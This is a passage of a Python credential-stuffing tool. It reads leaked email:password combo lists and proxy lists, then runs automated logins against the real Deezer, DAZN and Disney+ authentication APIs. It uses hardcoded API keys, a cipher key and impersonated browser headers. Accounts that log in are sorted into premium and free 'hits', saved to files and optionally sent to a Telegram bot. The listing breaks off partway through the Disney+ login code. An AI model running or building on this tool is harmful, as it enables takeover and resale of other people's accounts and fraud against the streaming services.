#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FULL CHECKERS — ALL IN ONE PYTHON FILE
Termux / Pydroid / PC — no extra checker files needed

Features:
  - Colour menu + animations
  - Paste combos (Ctrl+D) + paste proxies (Ctrl+D)
  - Threads 1-40 + progress bar
  - Saves HITS/FREE/BAD/RETRY/ERRORS/SUMMARY on device
  - Telegram auto-send when token + chat id set

Run:  python FULL_CHECKERS_ALL_IN_ONE.py
"""
from __future__ import annotations

import os
import sys
import re
import time
import random
import threading
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
try:
    from tqdm import tqdm
    HAS_TQDM = True
except Exception:
    HAS_TQDM = False
from datetime import datetime

# ==================== CONFIG (EDIT) ====================
# Telegram bot — all hits/free/bad/errors/summary files sent here
TG_BOT_TOKEN = os.getenv("TG_BOT_TOKEN", "").strip() or "PUT_BOT_TOKEN_HERE"
TG_CHAT_ID   = os.getenv("TG_CHAT_ID", "").strip() or "PUT_CHAT_ID_HERE"
AUTHOR = "@samviir1"
# ========================================================

try:
    from colorama import init as colorama_init, Fore, Style
    colorama_init()
except Exception:
    class _F:
        RED = GREEN = YELLOW = CYAN = MAGENTA = BLUE = WHITE = RESET = ""
        LIGHTGREEN_EX = LIGHTRED_EX = LIGHTYELLOW_EX = LIGHTCYAN_EX = LIGHTMAGENTA_EX = ""
    class _S:
        BRIGHT = RESET_ALL = DIM = ""
    Fore, Style = _F(), _S()

import requests as std_requests
import requests  # bare name for all checkers
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS")

try:
    from curl_cffi import requests as _cffi_mod
    HAS_CFFI = True
except Exception:
    _cffi_mod = None
    HAS_CFFI = False

# cffi_requests / curl_requests aliases — always safe on Pydroid (no impersonate if plain requests)
cffi_requests = _cffi_mod if HAS_CFFI else requests
curl_requests = cffi_requests

import builtins
builtins.requests = requests
builtins.cffi_requests = cffi_requests
builtins.curl_requests = curl_requests
builtins.HAS_CFFI = HAS_CFFI


def make_session(impersonate=None, **kwargs):
    """Session that works on Termux/Pydroid: impersonate only if real curl_cffi."""
    if HAS_CFFI and _cffi_mod is not None:
        try:
            if impersonate:
                return _cffi_mod.Session(impersonate=impersonate, **kwargs)
            return _cffi_mod.Session(**kwargs)
        except TypeError:
            return _cffi_mod.Session()
        except Exception:
            pass
    return requests.Session()

import hashlib
import base64
import hmac
import uuid
import html
import logging
import inspect
from urllib.parse import quote, urlencode, quote_plus
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except Exception:
    try:
        from Cryptodome.Cipher import AES
        from Cryptodome.Util.Padding import pad, unpad
    except Exception:
        AES = None
        def pad(x, *a, **k): return x
        def unpad(x, *a, **k): return x
logger = logging.getLogger("multi_cli")


_ANSI = hasattr(sys.stdout, "isatty") and sys.stdout.isatty()


def c(text, color=Fore.CYAN, bright=True):
    if not _ANSI:
        return str(text)
    return f"{Style.BRIGHT if bright else ''}{color}{text}{Style.RESET_ALL}"


def ok(msg):  print(c("[✓] ", Fore.GREEN) + str(msg))
def info(msg): print(c("[i] ", Fore.CYAN) + str(msg))
def warn(msg): print(c("[!] ", Fore.YELLOW) + str(msg))
def err(msg):  print(c("[x] ", Fore.RED) + str(msg))
def ask(msg):  return input(c("[?] ", Fore.MAGENTA) + str(msg)).strip()


def banner(title: str):
    line = "═" * 56
    art = [
        "  ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗",
        " ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝",
        " ██║     ███████║█████╗  ██║     █████╔╝ ",
        " ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ",
        " ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗",
        "  ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝",
    ]
    print()
    print(c(line, Fore.MAGENTA))
    for row in art:
        print(c(row, Fore.CYAN))
        time.sleep(0.025)
    print(c(f"  {title}", Fore.GREEN))
    print(c(f"  Telegram Ready • by {AUTHOR}", Fore.YELLOW))
    print(c(line, Fore.MAGENTA))
    cols = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.MAGENTA]
    msg = " READY | COMBOS | PROXIES | CHECK | SAVE | TELEGRAM "
    print("".join(c(ch, cols[i % len(cols)]) for i, ch in enumerate(msg)))
    print()


def tg_enabled():
    tok = (TG_BOT_TOKEN or "").strip()
    cid = (TG_CHAT_ID or "").strip()
    if not tok or not cid:
        return False
    if tok.startswith("PUT_") or cid.startswith("PUT_"):
        return False
    return True


def tg_send(text: str, document_path: str | None = None):
    if not tg_enabled():
        return False
    try:
        if document_path and os.path.isfile(document_path):
            url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendDocument"
            with open(document_path, "rb") as f:
                std_requests.post(
                    url,
                    data={"chat_id": TG_CHAT_ID, "caption": text[:1000]},
                    files={"document": f},
                    timeout=60,
                )
        else:
            url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
            std_requests.post(
                url,
                json={"chat_id": TG_CHAT_ID, "text": text, "parse_mode": "HTML"},
                timeout=30,
            )
        return True
    except Exception as e:
        warn(f"Telegram send failed: {e}")
        return False


def format_proxy(proxy: str):
    if not proxy:
        return None
    proxy = proxy.strip()
    if proxy.startswith(("http://", "https://", "socks5://", "socks4://")):
        return proxy
    parts = proxy.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    if "@" in proxy:
        return f"http://{proxy}"
    return f"http://{proxy}"


def load_lines_interactive(label: str):
    path = ask(f"Enter {label} file (or press Enter to paste): ")
    lines = []
    if path and os.path.isfile(path):
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            lines = [ln.strip() for ln in f if ln.strip() and not ln.strip().startswith("#")]
        ok(f"Loaded {len(lines)} lines from file")
        return lines
    print(c(f"[?] Paste {label} (one per line, Ctrl+D / Ctrl+Z to finish):", Fore.MAGENTA))
    try:
        buf = sys.stdin.read()
    except EOFError:
        buf = ""
    lines = [ln.strip() for ln in buf.splitlines() if ln.strip() and not ln.strip().startswith("#")]
    ok(f"Loaded {len(lines)} {label} from paste")
    return lines


_combo_re = re.compile(
    r"^\s*([^:\s|]+@[^:\s|]+\.[A-Za-z]{2,})\s*:\s*([^\s|]+)",
    re.I,
)


def extract_combos(raw_lines):
    out, seen = [], set()
    for line in raw_lines or []:
        line = str(line).strip()
        if not line or line.startswith("#"):
            continue
        m = _combo_re.match(line)
        if m:
            email, pw = m.group(1).lower().strip(), m.group(2).strip()
        elif ":" in line:
            a, b = line.split(":", 1)
            email = a.strip().lower()
            # password may be empty / only spaces / only |
            parts = b.strip().split()
            if not parts:
                continue
            pw = parts[0].split("|")[0].strip()
            if "@" not in email:
                continue
        else:
            continue
        if not email or not pw or "@" not in email:
            continue
        key = f"{email}:{pw}"
        if key not in seen:
            seen.add(key)
            out.append(key)
    return out


def extract_proxies(raw_lines):
    out = []
    for ln in raw_lines:
        p = format_proxy(ln)
        if p:
            out.append(p)
    return out


class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.checked = 0
        self.hits = 0
        self.free = 0
        self.bad = 0
        self.errors = 0
        self.retry = 0
        self.start = time.time()
        self.hit_lines, self.free_lines, self.bad_lines = [], [], []
        self.error_lines, self.retry_lines = [], []
        self.platform_hits = {}  # platform -> list of full hit lines

    def add(self, kind, line, platform=None):
        with self.lock:
            self.checked += 1
            if kind == "hit":
                self.hits += 1
                self.hit_lines.append(line)
                if platform:
                    self.platform_hits.setdefault(platform, []).append(line)
                else:
                    # try parse [Platform:hit] tags from multi
                    import re as _re
                    for m in _re.finditer(r"\[([^\]:]+):hit\]", line, _re.I):
                        self.platform_hits.setdefault(m.group(1), []).append(line)
            elif kind == "free":
                self.free += 1
                self.free_lines.append(line)
            elif kind == "bad":
                self.bad += 1
                self.bad_lines.append(line)
            elif kind == "retry":
                self.retry += 1
                self.retry_lines.append(line)
            else:
                self.errors += 1
                self.error_lines.append(line)

    def summary_text(self, tool, total):
        elapsed = max(0.1, time.time() - self.start)
        cpm = int(self.checked / elapsed * 60)
        lines = [
            f"{tool} — Summary",
            "━━━━━━━━━━━━━━━━━━━━",
            f"Total: {total}",
            f"Checked: {self.checked}",
            f"Hits: {self.hits}",
            f"Free: {self.free}",
            f"Bad: {self.bad}",
            f"Retry: {self.retry}",
            f"Errors: {self.errors}",
            f"Time: {elapsed:.1f}s | CPM: {cpm}",
        ]
        if self.platform_hits:
            lines.append("━━━━━━━━━━━━━━━━━━━━")
            lines.append("Platform Hits:")
            for plat, rows in sorted(self.platform_hits.items(), key=lambda x: (-len(x[1]), x[0].lower())):
                lines.append(f"  {plat}: {len(rows)}")
        lines.append(f"by {AUTHOR}")
        return "\n".join(lines)


def save_results(tool, stats):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    folder = f"results_{tool}_{ts}"
    os.makedirs(folder, exist_ok=True)
    mapping = {
        "HITS.txt": stats.hit_lines,
        "FREE.txt": stats.free_lines,
        "BAD.txt": stats.bad_lines,
        "RETRY.txt": stats.retry_lines,
        "ERRORS.txt": stats.error_lines,
    }
    for name, rows in mapping.items():
        path = os.path.join(folder, name)
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"# {tool} {name} — {datetime.now().isoformat()} — {AUTHOR}\n")
            # sectioned platform hits inside HITS.txt
            if name == "HITS.txt" and getattr(stats, "platform_hits", None):
                for plat, prows in sorted(stats.platform_hits.items(), key=lambda x: x[0].lower()):
                    f.write(f"\n===== {plat} ({len(prows)}) =====\n")
                    for r in prows:
                        f.write(r + "\n")
            else:
                for r in rows:
                    f.write(r + "\n")
    # per-platform hit files
    if getattr(stats, "platform_hits", None):
        for plat, prows in stats.platform_hits.items():
            safe = "".join(c if c.isalnum() or c in "-_" else "_" for c in plat)
            path = os.path.join(folder, f"HITS_{safe}.txt")
            with open(path, "w", encoding="utf-8") as f:
                f.write(f"# {tool} HITS — {plat} — {datetime.now().isoformat()} — {AUTHOR}\n")
                for r in prows:
                    f.write(r + "\n")
    summary_path = os.path.join(folder, "SUMMARY.txt")
    with open(summary_path, "w", encoding="utf-8") as f:
        f.write(stats.summary_text(tool, stats.checked))
    ok(f"Results saved → {folder}/")
    return folder


def run_pool(combos, proxies, workers, check_fn, tool_name):
    stats = Stats()
    total = len(combos)
    proxy_pool = list(proxies or [])
    bad_proxies = set()
    plock = threading.Lock()

    def pick_proxy():
        with plock:
            avail = [p for p in proxy_pool if p not in bad_proxies]
            if not avail and proxy_pool:
                bad_proxies.clear()
                avail = list(proxy_pool)
            return random.choice(avail) if avail else None

    print_lock = threading.Lock()

    def worker(combo):
        if ":" not in combo:
            stats.add("error", f"{combo} | invalid format")
            return
        email, password = combo.split(":", 1)
        email, password = email.strip(), password.strip()
        proxy = pick_proxy()
        kind, line = "error", f"{combo} | error"
        try:
            kind, line = check_fn(email, password, proxy)
        except Exception as e:
            kind, line = "error", f"{combo} | {str(e)[:100]}"
        if kind in ("retry", "error") and proxy:
            proxy2 = pick_proxy()
            if proxy2 and proxy2 != proxy:
                try:
                    kind, line = check_fn(email, password, proxy2)
                except Exception:
                    pass
        stats.add(kind, line)
        with print_lock:
            n = stats.checked
            tag = {"hit": ("HIT ", Fore.GREEN), "free": ("FREE", Fore.CYAN), "bad": ("BAD ", Fore.RED),
                   "retry": ("RTRY", Fore.YELLOW)}.get(kind, ("ERR ", Fore.YELLOW))
            print(c(f"[{n}/{total}] {tag[0]} ", tag[1]) + line[:140])

    workers = max(1, min(int(workers or 1), 40))
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(worker, c) for c in combos]
        if HAS_TQDM:
            for _ in tqdm(as_completed(futs), total=len(futs), desc=tool_name, ncols=70):
                pass
        else:
            for _ in as_completed(futs):
                pass

    folder = save_results(tool_name, stats)
    summary = stats.summary_text(tool_name, total)
    print()
    print(c(summary, Fore.CYAN))
    if tg_enabled():
        ok("Telegram enabled — sending summary + files…")
        tg_send(f"<b>{tool_name}</b>\n<pre>{summary}</pre>")
        for name in ("HITS.txt", "FREE.txt", "BAD.txt", "RETRY.txt", "ERRORS.txt", "SUMMARY.txt"):
            p = os.path.join(folder, name)
            if os.path.isfile(p) and os.path.getsize(p) > 50:
                tg_send(f"{tool_name} — {name}", document_path=p)
    else:
        warn("Telegram disabled — set TG_BOT_TOKEN and TG_CHAT_ID")
    return stats, folder


def cli_bootstrap(tool_name):
    banner(tool_name)
    if tg_enabled():
        ok("Telegram enabled")
    else:
        warn("Telegram disabled (set TG_BOT_TOKEN + TG_CHAT_ID)")
    raw_c = load_lines_interactive("combo")
    combos = extract_combos(raw_c)
    if not combos:
        err("No combos loaded.")
        sys.exit(1)
    ok(f"Loaded {len(combos)} combos")
    raw_p = load_lines_interactive("proxy")
    proxies = extract_proxies(raw_p)
    if proxies:
        ok(f"Loaded {len(proxies)} proxies")
    else:
        warn("No proxies — direct connection")
    try:
        threads = int(ask("Threads (1-40, default 5): ") or "5")
    except Exception:
        threads = 5
    return combos, proxies, threads


# =============================================================================
# BOT CHECKER ENGINES (ported)
# =============================================================================

# ---- minimal shims so bot checker classes run in CLI ----
CONTACT_ADMIN = "@samviir1"
AUTHOR = "@samviir1"

def E(key, default="•"):
    return default

def clean_val(v, default="-"):
    if v is None:
        return default
    s = str(v).strip()
    if s.upper() in ("N/A", "NA", "NONE", "NULL", "UNKNOWN", ""):
        return default
    return s

def format_country(val):
    if not val or str(val).strip().upper() in ("N/A", "NONE", "", "-", "UNKNOWN"):
        return "-"
    return str(val).strip()

def safe_choice(seq, default=None):
    try:
        if seq:
            return random.choice(seq)
    except Exception:
        pass
    return default

# typing Optional
try:
    from typing import Optional, Any, Dict, List
except Exception:
    Optional = Any = Dict = List = None


CONTACT_ADMIN = "@samviir1"
NBA_AUTHOR = "@samvir1"
NBA_CLIENT_ID = "d3S9lWRVmuunNhQ5_0xnyHB-Q3gpEXCrCmdgePkELTw"
NBA_USER_AGENT = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
NBA_NEWRELIC_ID = "VwcFU1BTCRABVlZRBAgDX1cG"
NBA_PAYMENT_KEY = "a08524b6b2cfb31633344639fe7f482cfbd216ccc135dcdb263cbb3b3a25c9970a444685dfa94d7876e66162347725d19c651639b1584a33d9256037485141f4"
PARAMOUNT_BASE = "https://www.paramountplus.com"
PARAMOUNT_AUTHOR = "@samvir1"
PARAMOUNT_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
COMMON_HEADERS = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': PARAMOUNT_UA,
    'x-requested-with': 'XMLHttpRequest',
}
DEBUG = False



class DeezerChecker:
    def __init__(self, proxy=None, timeout=15):
        self.proxy = proxy
        self.timeout = timeout

    def check(self, email: str, password: str, proxy=None) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except (httpx.ConnectError, httpx.TimeoutException, httpx.NetworkError, ConnectionResetError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "message": "Max retries exceeded"}

    def _check_internal(self, email, password, proxy):
        session = httpx.Client(timeout=self.timeout, headers={"User-Agent": "Deezer/8.0.50.5 (Android; 12; Mobile; us)"})
        if proxy: session.proxies = {"http://": proxy, "https://": proxy}
        try:
            r1 = session.get("https://api.deezer.com/1.0/gateway.php", params={"api_key": "4VCYIJUCDLOUELGD1V8WBVYBNVDYOXEWSLLZDONGBBDFVXTZJRXPR29JRLQFO6ZE", "output": "3", "version": "8.0.50.5", "method": "mobile_auth"})
            token_hex = r1.json()["results"]["TOKEN"]
            encrypted = binascii.unhexlify(token_hex)
            cipher = AES.new(bytes([0x56, 0x42, 0x4B, 0x31, 0x46, 0x53, 0x55, 0x45, 0x58, 0x48, 0x54, 0x53, 0x44, 0x42, 0x4A, 0x4A]), AES.MODE_ECB)
            decrypted = cipher.decrypt(encrypted).decode('utf-8', errors='ignore')
            token_string, token_key, user_info_key = decrypted[:64], decrypted[64:80].encode(), decrypted[80:96].encode()
            auth_token = binascii.hexlify(AES.new(token_key, AES.MODE_ECB).encrypt(token_string.encode())).decode()
            r2 = session.get("https://api.deezer.com/1.0/gateway.php", params={"api_key": "4VCYIJUCDLOUELGD1V8WBVYBNVDYOXEWSLLZDONGBBDFVXTZJRXPR29JRLQFO6ZE", "output": "3", "method": "api_checkToken", "auth_token": auth_token})
            sid = r2.json()["results"]
            r3 = session.post("https://api.deezer.com/1.0/gateway.php", params={"api_key": "4VCYIJUCDLOUELGD1V8WBVYBNVDYOXEWSLLZDONGBBDFVXTZJRXPR29JRLQFO6ZE", "sid": sid, "method": "user_checkRegisterConstraints", "output": "3", "input": "3"}, content=json.dumps({"EMAIL": email}), headers={"Content-Type": "application/json"})
            if r3.status_code != 200: return {"status": "error", "message": f"HTTP {r3.status_code}"}
            reg_data = r3.json()
            results = reg_data.get("results", {})
            errors = results.get("errors", {})
            email_already_used = (results.get("email_already_used") or errors.get("email", {}).get("error") == "email_already_used" or "email_already_used" in str(errors))
            if not email_already_used: return {"status": "bad", "message": "Not registered"}
            pwd_hex = (binascii.hexlify(password.encode()).decode().lower() + "0" * 32)[:32]
            enc_pass = binascii.hexlify(AES.new(user_info_key, AES.MODE_ECB).encrypt(binascii.unhexlify(pwd_hex))).decode()
            r4 = session.post("https://api.deezer.com/1.0/gateway.php", params={"api_key": "4VCYIJUCDLOUELGD1V8WBVYBNVDYOXEWSLLZDONGBBDFVXTZJRXPR29JRLQFO6ZE", "method": "mobile_userAuth", "input": "3", "output": "3", "sid": sid}, content=json.dumps({"mail": email, "password": enc_pass}), headers={"Content-Type": "application/json"})
            login_result = r4.json()
            if "error" in login_result and isinstance(login_result["error"], dict) and login_result["error"]:
                err = login_result["error"]
                if "bad-credentials" in str(err).lower(): return {"status": "bad", "message": "Invalid credentials"}
                return {"status": "error", "message": str(err)}
            user = login_result.get("results", {})
            if not user: return {"status": "error", "message": "Empty results"}
            premium = user.get("PREMIUM", {})
            status = "premium" if premium.get("STATUS", 0) == 1 else "free"
            exp_date = premium.get("DATE_END", "")[:10] if premium.get("DATE_END") else "N/A"
            return {"status": status, "offer_name": premium.get("OFFER_NAME", "Deezer Free"), "expiration_date": exp_date, "country": user.get("COUNTRY", ""), "user_name": user.get("BLOG_NAME", user.get("USER_NAME", ""))}
        except Exception as e:
            return {"status": "error", "message": str(e)[:80]}
        finally:
            session.close()

# ----- 2. DAZNChecker -----
class DAZNChecker:
    def __init__(self, proxy=None, timeout=15):
        self.proxy = proxy
        self.timeout = timeout

    def check(self, email, password, proxy=None) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except (curl_requests.errors.ProxyError, curl_requests.errors.Timeout, curl_requests.errors.ConnectionError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "message": "Max retries exceeded"}

    def _check_internal(self, email, password, proxy):
        session = curl_requests.Session()
        (setattr(session, "impersonate", "chrome110") if HAS_CFFI else None)
        if proxy: session.proxies = {"http": proxy, "https": proxy}
        device_id = str(uuid.uuid4())
        session_id = str(uuid.uuid4())
        bearer_token = None

        payload = {"DeviceId": device_id, "Email": email, "Password": password, "Platform": "android"}
        headers = {"Accept": "*/*", "Content-Type": "application/json", "Host": "authentication-prod.ar.indazn.com", "Origin": "https://tv.dazn.com", "Referer": "https://tv.dazn.com/", "User-Agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36", "x-brand": "dazn", "x-dazn-device": device_id, "X-Requested-With": "com.dazn"}
        resp = session.post("https://authentication-prod.ar.indazn.com/v5/SignIn", json=payload, headers=headers, timeout=self.timeout)
        src = resp.text
        if any(x in src for x in ["InvalidPassword", "InvalidEmailFormat", "AccountBlocked"]): return {"status": "BAD", "error": "Invalid credentials/blocked"}
        if "AuthToken" not in src and "Token" not in src: return {"status": "BAD", "error": "No token"}
        token_key = '"Token":"' if '"Token":"' in src else '"AuthToken":"'
        bearer_token = src.split(token_key)[1].split('"')[0]
        if not bearer_token: return {"status": "BAD", "error": "No token"}

        headers = {"Authorization": f"Bearer {bearer_token}", "Origin": "https://www.dazn.com", "Referer": "https://www.dazn.com/", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "application/json", "x-brand": "dazn", "x-daznid": device_id, "x-session-id": session_id}
        resp = session.get("https://myaccount-bff.ar.indazn.com/v1/subscriptions", headers=headers, timeout=self.timeout)
        if resp.status_code == 404: return {"status": "FREE", "plan": "No Subscription"}
        data = resp.json()
        subs = data.get("Subscriptions", [])
        if not subs and isinstance(data, list): subs = data
        if not subs: return {"status": "FREE", "plan": "No Subscription"}
        sub = subs[0]
        return {"status": "HIT", "plan": sub.get("PlanName", "Premium"), "expiry_date": sub.get("EndDate", ""), "country": sub.get("Country", ""), "renewal": sub.get("NextBillingDate", "")}

# ----- 3. Disney+ Checker -----
class DisneyChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.req_timeout = 15
        self.sdk_key = "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
        self.base_url = "https://disney.api.edge.bamgrid.com"
        self.device_reg_endpoint = f"{self.base_url}/graph/v1/device/graphql"
        self.graphql_endpoint = f"{self.base_url}/v1/public/graphql"
        self.subs_endpoint = f"{self.base_url}/v2/subscribers"
        self.x_app_version = "c4b66d76"
        self.x_sdk_client = "disney-svod-3d9324fc"
        self.x_sdk_platform = "javascript/android/chrome"
        self.x_sdk_version = "c4b66d76-disneyplus-nsx"
        self.x_identity_client = "DTCI-DISNEYPLUS.WEB"
        self.base_headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://www.disneyplus.com",
            "Referer": "https://www.disneyplus.com/",
            "Sec-Ch-Ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "X-Application-Version": self.x_app_version,
            "X-Bamsdk-Client-Id": self.x_sdk_client,
            "X-Bamsdk-Platform": self.x_sdk_platform,
            "X-Bamsdk-Platform-Id": "browser",
            "X-Bamsdk-Version": self.x_sdk_version,
            "X-Bamtech-Wpnx-Mlp-Identifier": "/",
            "X-Bamtech-Wpnx-Mlp-Locale": "en-us",
            "X-Disney-Identity-Client-Id": self.x_identity_client,
        }
        self.register_query = """
        mutation registerDevice($input: RegisterDeviceInput!) {
          registerDevice(registerDevice: $input) {
            grant { grantType assertion }
          }
        }
        """
        self.check_email_query = """
        query check($email: String!, $validateEmailOnOperations: ValidateEmailOnOperationsInput) {
          check(email: $email, validateEmailOnOperations: $validateEmailOnOperations) {
            operations
            nextOperation
            email { isValid validationFailureCodes suggestions { domain } }
          }
        }
        """
        self.login_mutation = """
        mutation login($input: LoginInput!) {
          login(login: $input) {
            actionGrant
            account { activeProfile { id } profiles { id attributes { isDefault parentalControls { isPinProtected } } } }
            activeSession { isSubscriber }
            identity { personalInfo { dateOfBirth gender } flows { personalInfo { requiresCollection eligibleForCollection } } }
          }
        }
        """
        self.me_query = """
        query me {
          me {
            account {
              activeProfile { id name }
              profiles { id name }
              attributes { email emailVerified locations { registration { geoIp { country } } purchase { country } } }
            }
            identity {
              email
              subscriber {
                subscriberStatus
                subscriptions {
                  id
                  state
                  partner
                  source { sourceProvider sourceType subType }
                  product { name subscriptionPeriod earlyAccess trial { duration } categoryCodes }
                  term { expiryDate nextRenewalDate isFreeTrial }
                }
              }
            }
          }
        }
        """

    def _safe_json(self, resp):
        try:
            return resp.json()
        except:
            return None

    def _build_headers(self, auth_token=None, request_id=None):
        headers = self.base_headers.copy()
        if auth_token:
            headers["Authorization"] = f"Bearer {auth_token}"
        if request_id:
            headers["X-Request-ID"] = request_id
            headers["X-BAMSDK-Transaction-ID"] = request_id
        return headers

    def _spawn_device(self, session):
        request_id = str(uuid.uuid4())
        payload = {
            "operationName": "registerDevice",
            "query": self.register_query,
            "variables": {
                "input": {
                    "deviceFamily": "browser",
                    "applicationRuntime": "chrome",
                    "deviceProfile": "browser",
                    "deviceLanguage": "en",
                    "devicePlatformId": "browser",
                    "attributes": {
                        "brand": "web",
                        "browserName": "chrome",
                        "browserVersion": "139.0.0.0",
                        "manufacturer": "n/a",
                        "model": None,
                        "operatingSystem": "android",
                        "operatingSystemVersion": "10.0",
                        "osDeviceIds": []
                    }
                }
            }
        }
        try:
            response = session.post(
                self.device_reg_endpoint,
                headers=self._build_headers(auth_token=self.sdk_key, request_id=request_id),
                json=payload,
                timeout=self.req_timeout
            )
        except:
            return None
        if response.status_code != 200:
            return None
        data = self._safe_json(response)
        try:
            return data.get("extensions", {}).get("sdk", {}).get("token", {}).get("accessToken")
        except:
            return None

    def _verify_email(self, session, device_token, email):
        request_id = str(uuid.uuid4())
        payload = {
            "operationName": "check",
            "query": self.check_email_query,
            "variables": {
                "email": email,
                "validateEmailOnOperations": {"operations": ["Register"]}
            }
        }
        try:
            response = session.post(
                self.graphql_endpoint,
                headers=self._build_headers(auth_token=device_token, request_id=request_id),
                json=payload,
                timeout=self.req_timeout
            )
        except:
            return False
        if response.status_code != 200:
            return False
        data = self._safe_json(response)
        if not data:
            return False
        if data.get("errors"):
            return False
        operations = data.get("data", {}).get("check", {}).get("operations", [])
        return bool(operations) and operations != ["Register"]

    def _login(self, session, device_token, email, password):
        request_id = str(uuid.uuid4())
        payload = {
            "operationName": "login",
            "query": self.login_mutation,
            "variables": {
                "input": {"email": email, "password": password}
            }
        }
        try:
            response = session.post(
                self.graphql_endpoint,
                headers=self._build_headers(auth_token=device_token, request_id=request_id),
                json=payload,
                timeout=self.req_timeout
            )
        except:
            return None, False, "", "network_error"
        if response.status_code != 200:
            return None, False, "", f"http_{response.status_code}"
        data = self._safe_json(response)
        if not data:
            return None, False, "", "invalid_json"
        errors = data.get("errors")
        if errors:
            code = errors[0].get("extensions", {}).get("code", "unknown_error")
            return None, False, "", code
        try:
            user_token = data.get("extensions", {}).get("sdk", {}).get("token", {}).get("accessToken")
            is_subscriber = data.get("data", {}).get("login", {}).get("activeSession", {}).get("isSubscriber", False)
            country = data.get("extensions", {}).get("sdk", {}).get("session", {}).get("location", {}).get("countryCode", "")
        except:
            return None, False, "", "extraction_error"
        return user_token, is_subscriber, country, None

    def _fetch_account_details(self, session, user_token):
        try:
            response = session.post(
                self.graphql_endpoint,
                headers=self._build_headers(auth_token=user_token, request_id=str(uuid.uuid4())),
                json={"query": self.me_query},
                timeout=self.req_timeout
            )
            if response.status_code != 200:
                return {}
            data = self._safe_json(response)
            return data.get("data", {}).get("me", {}) if data else {}
        except:
            return {}

    def _get_sub_details(self, session, user_token):
        request_id = str(uuid.uuid4())
        try:
            response = session.get(
                self.subs_endpoint,
                headers=self._build_headers(auth_token=user_token, request_id=request_id),
                timeout=self.req_timeout
            )
        except:
            return {"is_active": False, "error": "Network error"}
        if response.status_code != 200:
            return {"is_active": False, "error": f"HTTP {response.status_code}"}
        data = self._safe_json(response)
        if not isinstance(data, list) or len(data) == 0:
            return {"is_active": False, "plan": "None"}
        sub = data[0]
        return {
            "is_active": sub.get("subscriberStatus") == "ACTIVE",
            "plan": sub.get("product", {}).get("name", "Unknown"),
            "period": sub.get("product", {}).get("subscriptionPeriod", "N/A"),
            "is_free_trial": sub.get("term", {}).get("isFreeTrial", False),
            "next_renewal": sub.get("term", {}).get("nextRenewalDate", "")[:10]
        }

    def check(self, email: str, password: str) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password)
            except (curl_requests.errors.ProxyError, curl_requests.errors.Timeout, curl_requests.errors.ConnectionError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "message": "Max retries exceeded"}

    def _check_internal(self, email: str, password: str) -> Dict:
        proxies = None
        if self.proxy:
            proxies = {"http": self.proxy, "https": self.proxy}
        session = make_session(impersonate="chrome131_android")
        if proxies:
            session.proxies = proxies

        result = {"status": "error", "message": "", "email": email, "password": password}

        device_token = self._spawn_device(session)
        if not device_token:
            result["message"] = "Device registration failed"
            return result

        if not self._verify_email(session, device_token, email):
            result["status"] = "bad"
            result["message"] = "Email not registered"
            return result

        user_token, is_subscriber, country, error_code = self._login(session, device_token, email, password)
        if error_code:
            if "bad-credentials" in error_code.lower():
